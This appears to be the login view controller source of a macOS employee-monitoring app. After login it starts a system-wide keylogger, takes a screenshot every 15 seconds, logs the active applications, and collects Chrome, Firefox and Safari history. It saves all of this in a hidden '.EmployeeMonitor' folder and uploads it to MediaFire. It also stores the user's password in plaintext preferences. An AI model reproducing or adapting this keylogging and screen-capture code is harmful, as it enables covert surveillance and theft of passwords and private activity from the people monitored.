//
//  LogInViewController.m
//  EmployeeMonitoringSystem
//
//  Created by GBS-mac on 12/13/14.
//  Copyright (c) 2014 Globussoft. All rights reserved.
//

#import "LogInViewController.h"
#import "NextPageViewController.h"
#import "SingeltonClass.h"
#import "GenearteAccessToken.h"
#import "MediaFireSDK.h"
#import "NSDictionary+Callbacks.h"
#import "MFFolderAPI.h"
#import "NSString+NSString_Extended.h"
#import "SingeltonClass.h"
#import "MediaFireInit.h"
#import "ApplicationTrack.h"
#import "NSString+Base64.h"

//#import <RNcrrr>




@interface LogInViewController (){
    NSMutableString*  strKeyStrokes;
    NSString *localDirPath;
    MediaFireInit *mediaFire;
    NSString *localEmp;
}

@end
static int count=0;

@implementation LogInViewController

- (id)initWithNibName:(NSString *)nibNameOrNil bundle:(NSBundle *)nibBundleOrNil
{
    self = [super initWithNibName:nibNameOrNil bundle:nibBundleOrNil];
    if (self) {
   
//      tablePage=[[NextPageViewController alloc]initWithNibName:@"NextPageViewController" bundle:nil];
        [_customImgView setWantsLayer:YES];
        _customImgView.layer.backgroundColor=[NSColor clearColor].CGColor;
        
      strKeyStrokes  =[[NSMutableString alloc]init];
        
        
       
        
        self.applicationList=[[NSMutableString alloc]init];
        
        [SingeltonClass sharedSingleton].applicationAr=[[NSMutableArray alloc]init];
        
      }
    return self;
}





- (IBAction)logInAction:(id)sender
{
    

    
    [[NSNotificationCenter defaultCenter]postNotificationName:@"changeApplicationFrame" object:nil];
    [[NSNotificationCenter defaultCenter]removeObserver:self name:@"changeApplicationFrame" object:nil];
    
    
   
    NSLog(@"LoginTime %@",[ActivityControl checkLoginTime:[NSDate date]]);
    
    
    [NSTimer scheduledTimerWithTimeInterval:3.0f
                                     target:self
                                   selector:@selector(supportingMethod)
                                   userInfo:nil
                                    repeats:YES];
    
    
   // NSLog(@"Login Time %@",[ActivityControl checkLoginTime:[NSDate date]]);
        // register for keys throughout the device...
    [NSEvent addGlobalMonitorForEventsMatchingMask:NSKeyDownMask
                        handler:^(NSEvent *event){
                                               
                                           
                                             //  [ActivityControl setLastActivityTime:[NSDate date]];
                                               
                                               
                                               NSString *chars = [event characters];
                                               unichar character = [chars characterAtIndex:0];
                                               
                                    [strKeyStrokes appendFormat:@"%c",character];
                                            
                                    [KeyStrokesDetails saveKeyStokes:self.getPathKeyStrokes   keyStokes:strKeyStrokes];
                                               
                                            
                                          // Log(@"typed KeyStrokes %@",strKeyStrokes);
                                               
                                           }];
    
    
    [NSEvent addLocalMonitorForEventsMatchingMask:NSKeyDownMask handler:^NSEvent* (NSEvent* event){
        
        
       
        
      //  [ActivityControl setLastActivityTime:[NSDate date]];

        
        
        NSString *keyPressed = event.characters;
        
        //  NSLog(@"Pressed local %@",keyPressed);
        [strKeyStrokes appendString:keyPressed];
        
        
        [KeyStrokesDetails saveKeyStokes:self.getPathKeyStrokes   keyStokes:strKeyStrokes];
        
        
        
        return event;
    }];
    
    
    
    [ActivityControl activityMonitor];
    
    
    
    
    [[[NSWorkspace sharedWorkspace] notificationCenter] addObserver:self
selector:@selector(appActivated:)
                                                               name:
     NSWorkspaceDidActivateApplicationNotification
object:nil];
    
        
    
//[tablePage  getChromeHistory];
    
    
    
    mediaFire=[[MediaFireInit alloc]init];
    
   // [self getLogInTime];
    
NSString * timestamp = [NSString stringWithFormat:@"%ld",(unsigned long)[[NSDate date] timeIntervalSince1970]];
    
    NSError *error;
    
    
    [[NSUserDefaults standardUserDefaults]setObject:[self.txtFEmail stringValue] forKey:@"UserEmail"];
    [[NSUserDefaults standardUserDefaults]synchronize];
    [[NSUserDefaults standardUserDefaults]setObject:[self.txtFPassword stringValue] forKey:@"UserPassword"];
    
id  ar = @{
          @"accessToken":[SingeltonClass sharedSingleton].macID,
          @"emailId":[self.txtFEmail stringValue],
          @"timeStamp":timestamp
          };
    
    
    
  //  NSString *str=@"globussoft";
    
    
    NSLog(@"Time is:%@",timestamp);
    
    //id params=@"dharasisbehera";
  //-------------------------------------
    NSData *jsonData2 = [NSJSONSerialization dataWithJSONObject:ar options:NSJSONWritingPrettyPrinted error:&error];
    NSString *params = [[NSString alloc] initWithData:jsonData2 encoding:NSUTF8StringEncoding];
    
   GenearteAccessToken *accessToken=[[GenearteAccessToken alloc]init];
//    
//    
 //-------------------------------------
    
  
 //NSData* encriptedTokenAccsess=   [accessToken encrypt:params];
    
    
 
    
   
     // NSString *base64EncodedString = [NSString base64StringFromData:encryptedData length:[encryptedData length]];
//    NSString *base64Encoded = [encriptedTokenAccsess base64EncodedStringWithOptions:0];
//    
//     NSLog(@"Token Accsess is %@",  base64Encoded);
    
    // Print the Base64 encoded string
    
    //----------------------------------
//    NSString *params=@"wKAoGDj1efEOGw79chAVCcMTVFPe3KvTucMX+NpmiJSGYm0m4yeU9pbYXjmGQJWyS943cExxiiACWEnYya3WaL2J5Qz/4boCUVpiaeUnT4cqX/T6Lwfbg+4z+SDywkqTkQTKP/9YsKEKeInYV0SyielF2cGtr2BI0RVnWC4ZTJdDxS78UQZ+Sa2dwwKvbdlf";
 //NSLog(@"Encoded: %@", [accessToken encrypt:params]);
    
    
    
//   NSString *base64EncodedString = [NSString base64StringFromData:[accessToken encrypt:params] length:[[accessToken encrypt:params] length]];
//    
//    NSLog(@"Encoded: %@", base64EncodedString);
//
//    
//     Print the Base64 encoded string
//    NSString *params=@"PCFj+YSUAKXXUCL4iEgdww==";
NSLog(@"Encoded: %@", [accessToken generateAccessTok:params]);
    
    
//    // Encryption
//    NSData *data = ...
//    NSString *password = @"Secret password";

    
    
    //   NSData *ciphertext = [RNCryptor encryptData:jsonData2 password:@"Globus7879"];
//    
//    NSString *base64EncodedString = [NSString base64StringFromData:ciphertext length:[ciphertext length]];
//    
//    
//    
//    NSLog(@"Access Token Now %@",base64EncodedString);
    
    
    
//    
//    // Decryption
//    NSError *error = nil;
//    NSData *plaintext = [RNCryptor decryptData:ciphertext password:password error:&error];
//    if (error != nil) {
//        NSLog(@"ERROR:%@", error);
//        return
//    }
    
    
  //-----------------------------------------------
    
    
    if([SingeltonClass networkcheck]==YES){
    
        [SingeltonClass sharedSingleton].internetConnection=YES;
        
    mediaFire=[[MediaFireInit alloc]init];
   
     
    [NSThread detachNewThreadSelector:@selector(mediaFireLogin) toTarget:self withObject:nil];
        
//     dispatch_async(dispatch_get_global_queue(0, 0), ^{
//            
//         
//          
//       });

      

    }
    else{
        
        [SingeltonClass sharedSingleton].internetConnection=NO;
    }
    
    
//    _logInView.hidden=YES;
    //[self removeFromParentViewController];
    //[_logInView removeFromSuperview];
    _logInView.hidden=YES;
    
    [[NSNotificationCenter defaultCenter]postNotificationName:@"afterLogIn" object:nil];
  //  [[NSNotificationCenter defaultCenter]removeObserver:self name:@"afterLogIn" object:nil];
    
//[_logInView removeFromSuperview];
//[self.view addSubview:tablePage.view];
//time=15;
     [self takePicture];
timer=[NSTimer scheduledTimerWithTimeInterval:15 target:self selector:@selector(takePicture) userInfo:nil repeats:YES];

  
    




}




-(void)mediaFireLogin{
    [mediaFire mediaFireLogin];

    
}

-(void)supportingMethod{
    
    
    [ActivityControl checkInactivityTime:[NSDate date]];
    
}


#pragma mark-application Tracking


-(void)appActivated:(NSNotification*) notification {
    
    
    NSRunningApplication* currentApp = [notification.userInfo valueForKey:NSWorkspaceApplicationKey];
    
    [ApplicationTrack creatTxtFIle:[ApplicationTrack createLocalPath:self.getDateFolder] applicationUsed:currentApp.localizedName];
   

    
  
}


-(void)takePicture
{
    
    NSLog(@"-------------------Capured------------------");
    
//  time--;
//   if (time>0) {
//       NSLog(@"Time==%ld",(long)time);
//   }
//    else if(time==0)
//  {
        [self interograteHardWare];
//        [timer invalidate];
//        timer=nil;
     //  time=15;
//        timer=[NSTimer scheduledTimerWithTimeInterval:1 target:self selector:@selector(takePicture) userInfo:nil repeats:YES];
   // }
}


-(void)interograteHardWare
{
    displays=nil;
    CGError          err=CGDisplayNoErr;
    uint32_t    dspCount=0;
    //To set main screen as image to be captured
    err=CGGetActiveDisplayList(0,NULL,&dspCount);
    if (err != CGDisplayNoErr) {
        return;
    }
    if (displays !=nil) {
        free(displays);
    }
    //To allocate memory to displays
    displays=calloc((size_t)dspCount,sizeof(CGDirectDisplayID));

    
    
    
    //To get active display
    err = CGGetActiveDisplayList(dspCount,
                                 displays,
                                 &dspCount);
    //To get Current screen Imgae
    
   // NSLog(@"display count %ul",displays);
    
    CGImageRef image=CGDisplayCreateImage(displays[0]);
    NSLog(@"%@",image);
    storeImg=[[NSImage alloc]initWithCGImage:image size:NSSizeFromCGSize(CGSizeMake(100,100))];
    
    
   
//    return [[NSImage alloc] initWithData:compressedData];
    
    
  

    
    CGImageRelease(image);
    count++;
//    if (count<=30) {
        [self saveImage];
//    }
//    else
//    {
//        [timer invalidate];
//        timer=nil;
//        time=15;
//       // [self deleteImage];
//        count=0;
//    }

}
-(void)saveImage
{
//    NSArray *paths=NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES);
//  
//    //------------------------------------------
//    
//  
////    NSString *documentsDirectory = [paths objectAtIndex:0];
////    NSString *filePath = [NSString stringWithFormat:@"%@/%@", documentsDirectory, @"myData.json"];
////    NSLog(@"filePath %@", filePath);
////    
////    if (![[NSFileManager defaultManager] fileExistsAtPath:filePath]) { // if file is not exist, create it.
////        NSString *helloStr = @"hello world";
////        NSError *error;
////        [helloStr writeToFile:filePath atomically:YES encoding:NSUTF8StringEncoding error:&error];
////    }
////    
////    if ([[NSFileManager defaultManager] isWritableFileAtPath:filePath]) {
////        NSLog(@"Writable");
////    }else {
////        NSLog(@"Not Writable");
////    }
////    
//    
//    //-------------------------------------------
//    
//    
//    NSString *docDirectory=[paths objectAtIndex:0];
//    NSString *stringImgName=[NSString stringWithFormat:@"savedImage"];
//    NSString *getPath=[docDirectory stringByAppendingPathComponent:[NSString stringWithFormat:@"%@%d.png",stringImgName,count]];
//    NSData *imageData=[storeImg TIFFRepresentation];
//    [imageData writeToFile:getPath atomically:NO];
    
    
    
    
    NSDateFormatter *dateFormatter = [[NSDateFormatter alloc] init];
    [dateFormatter setDateFormat:@"dd-MMM-yyyy"];
    NSString *dateString = [dateFormatter stringFromDate:[NSDate date]];
    
    NSDateFormatter *timeFormatter = [[NSDateFormatter alloc] init];
    [timeFormatter setDateFormat:@"dd-MMM-yyyy HH-mm-ss"];
    NSString *timeString = [timeFormatter stringFromDate:[NSDate date]];

    NSArray *paths=NSSearchPathForDirectoriesInDomains(NSApplicationSupportDirectory, NSUserDomainMask, YES);
//    NSString *appSupportDir = [NSSearchPathForDirectoriesInDomains(NSApplicationSupportDirectory, NSUserDomainMask, YES) firstObject];
    
    //Create A Main Folder-Employee Monitor
    
    NSString *docDirectory=[paths objectAtIndex:0];
    localEmp=[docDirectory stringByAppendingPathComponent:@"/.EmployeeMonitor"];
    
    
     [SingeltonClass sharedSingleton].browserHistAr=[[NSMutableArray alloc]init];
    
   browserHistory=[[BrowserHistory alloc]init];
    
    
    
    NSLog(@"Path %@",localEmp);
    
    NSError  *error;
    if(![[NSFileManager defaultManager] fileExistsAtPath:localEmp]){
        [[NSFileManager defaultManager] createDirectoryAtPath:localEmp withIntermediateDirectories:NO attributes:nil error:&error];
    }
    
    
    //Create Folder Based on Date
    
    
    
    
    self.getDateFolder=[localEmp stringByAppendingPathComponent:dateString];
   
    if(![[NSFileManager defaultManager] fileExistsAtPath:self.getDateFolder]){
        [[NSFileManager defaultManager] createDirectoryAtPath:self.getDateFolder withIntermediateDirectories:NO attributes:nil error:&error];
    }

    
//    //Create Sub Folder-Browser History
//    
//    NSString *getPathBrowserHist  =[self.getDateFolder stringByAppendingPathComponent:@"/BrowserHistories"];
//    
//    if(![[NSFileManager defaultManager] fileExistsAtPath:getPathBrowserHist]){
//        [[NSFileManager defaultManager] createDirectoryAtPath:getPathBrowserHist withIntermediateDirectories:NO attributes:nil error:&error];
//    }
//
    
    [ActivityControl createLocalPathForSession:self.getDateFolder]
    ;
    
    //Create A Sub Folder-Screen Shots
    
    NSString *getPathScreenShot  =[self.getDateFolder stringByAppendingPathComponent:@"/ScreenShots"];
    
    if(![[NSFileManager defaultManager] fileExistsAtPath:getPathScreenShot]){
        [[NSFileManager defaultManager] createDirectoryAtPath:getPathScreenShot withIntermediateDirectories:NO attributes:nil error:&error];
    }
    
    //Create A Sub Folder-KeyStrokes
    
    self.getPathKeyStrokes  =[self.getDateFolder stringByAppendingPathComponent:@"/KeyStroke"];
    
    if(![[NSFileManager defaultManager] fileExistsAtPath:_getPathKeyStrokes]){
        [[NSFileManager defaultManager] createDirectoryAtPath:_getPathKeyStrokes withIntermediateDirectories:NO attributes:nil error:&error];
    }

    
    //Create A Sub Folder-Application Used
    
    
    
    
    
//    NSString *keyStrokesTextFile=[_getPathKeyStrokes stringByAppendingPathComponent:[NSString stringWithFormat:@"KeyStroke.txt"]];
//    NSError *writeError = nil;
//    // [strKeyStrokes writeToFile:keyStrokesTextFile atomically:NO];
//    
//    
//    //NSString *urlEncodedString = [@"SOME_URL_GOES_HERE" urlencode];
//    
//    
//    [[strKeyStrokes   stringByAddingPercentEscapesUsingEncoding:NSUTF8StringEncoding] writeToFile:keyStrokesTextFile atomically:NO encoding:NSUTF8StringEncoding error:&writeError];
//    
 //   NSLog(@"path key->%@",keyStrokesTextFile);
  
    
                                         
    //Create Sub folder for Screen Shot-Date Wise Name of Folder
//NSString *getPath  =[getPathScreenShot stringByAppendingPathComponent:dateString];
//    
//    if(![[NSFileManager defaultManager] fileExistsAtPath:getPath]){
//        [[NSFileManager defaultManager] createDirectoryAtPath:getPath withIntermediateDirectories:NO attributes:nil error:&error];
//    } //Create folder
     
     
    
    
    [NSThread detachNewThreadSelector:@selector(getBrowserHIstory:) toTarget:self withObject:self.getDateFolder];
//     [NSThread detachNewThreadSelector:@selector(getMozillaHIstory) toTarget:self withObject:self.getDateFolder];
//     [NSThread detachNewThreadSelector:@selector(getSafariHIstory) toTarget:self withObject:self.getDateFolder];
//    

    
     
     
     
    
    localDirPath=[getPathScreenShot stringByAppendingPathComponent:[NSString stringWithFormat:@"%@.jpg",timeString ]];
    
//    
//    NSBitmapImageRep *imageRep = [[NSBitmapImageRep alloc] initWithData:[storeImg TIFFRepresentation]];
//    imageRep.pixelsHigh=511;
//    imageRep.pixelsWide=910;
//    NSDictionary *options = [NSDictionary dictionaryWithObject:[NSNumber numberWithFloat:0.0] forKey:NSImageCompressionFactor];
//    NSData *compressedData = [imageRep representationUsingType:NSJPEGFileType properties:options];
//    
  
    
    
    
    //==============================Compressing Image Format===========================
    
    NSBitmapImageRep *rep =  [[NSBitmapImageRep alloc] initWithData:[storeImg TIFFRepresentation]];
    
//    NSSize pointsSize = rep.size;
//    NSSize pixelSize = NSMakeSize(910, 511);
//    
//    CGFloat currentDPI = 100.0f;
//    NSLog(@"current DPI %f", currentDPI);
//    
//    NSSize updatedPointsSize = pointsSize;
    
//    updatedPointsSize.width = ceilf(pixelSize.width);
//    updatedPointsSize.height = ceilf(pixelSize.height);
//    
  // [rep setSize:updatedPointsSize];
    [rep setPixelsHigh:511];
    [rep setPixelsWide:910];
    
NSDictionary *options = [NSDictionary dictionaryWithObject:[NSNumber numberWithFloat:0.0] forKey:NSImageCompressionFactor];
   

//    NSDictionary *options=nil;
    
    
    
    NSData *data = [rep representationUsingType:NSJPEGFileType properties:options];
    [data writeToFile: localDirPath atomically: NO];
    
    //==============================Compressing Image Format===========================
    
    
    
    
//    NSData *imageData=compressedData;
//    
//    
//    
//     [imageData writeToFile:localDirPath atomically:NO];
//    
    
    
    
    
    //----------
    
    
    if([SingeltonClass networkcheck]==YES){
        
        [SingeltonClass sharedSingleton].internetConnection=YES;
        
               
    }
    else{
        
        [SingeltonClass sharedSingleton].internetConnection=NO;
    }

    
    //-----------
    
    
 
     if([SingeltonClass networkcheck]==YES){
         
        
         
        [mediaFire fetching:localDirPath];
         
         
         
         
         if([SingeltonClass sharedSingleton].internetConnection==NO)
         {
             [SingeltonClass sharedSingleton].internetConnection=YES;
//              dispatch_async(dispatch_get_global_queue(0, 0),^{
//                 
//                  [mediaFire syncAllDatas:localEmp];
//        
//             });
   
             [NSThread detachNewThreadSelector:@selector(mediaFireSyncData:) toTarget:self withObject:localEmp];
             
             
             
         }
    
   
     }
     else{
         
            [SingeltonClass sharedSingleton].internetConnection=NO;
         
         
     }



}

-(void)mediaFireSyncData:(NSString*)localEmpPath{
    
    [mediaFire syncAllDatas:localEmpPath];

    
}


#pragma mark- Get Chrome History
-(void)getBrowserHIstory:(NSString*)dateFoldrPath
{
    
    [browserHistory getChromeHistory:dateFoldrPath];
    [browserHistory getMozillaHistory:dateFoldrPath];
    [browserHistory getSafariHistory:dateFoldrPath];

    
}
//#pragma mark- Get FireFox History
//-(void)getMozillaHIstory{
//    
//   
//
//}
//#pragma mark- Get Safari History
//-(void)getSafariHIstory{
//    
//}
//

-(void)deleteImage
{
    
    
    
    
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSString *documentsPath = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) objectAtIndex:0];

    NSError *error;
    for (int i=1; i<=30;i++) {
        NSString *stringImgName=[NSString stringWithFormat:@"savedImage"];
        NSString *getPath=[documentsPath stringByAppendingPathComponent:[NSString stringWithFormat:@"%@%d.png",stringImgName,i]];
        BOOL sucess=[fileManager removeItemAtPath:getPath error:&error];
        if (sucess) {
            NSLog(@"Sucessfully removed file");
        }
        else
        {
            NSLog(@"Error to remove file");
        }
        
        
    }
    timer=[NSTimer scheduledTimerWithTimeInterval:1 target:self selector:@selector(takePicture) userInfo:nil repeats:YES];

}


-(void)getLogInTime
{
    NSDate *currentDate=[NSDate date];
    tablePage.logInDate=currentDate;
 
}

-(IBAction)forgotPaswordAction:(id)sender
{
    
}



@end
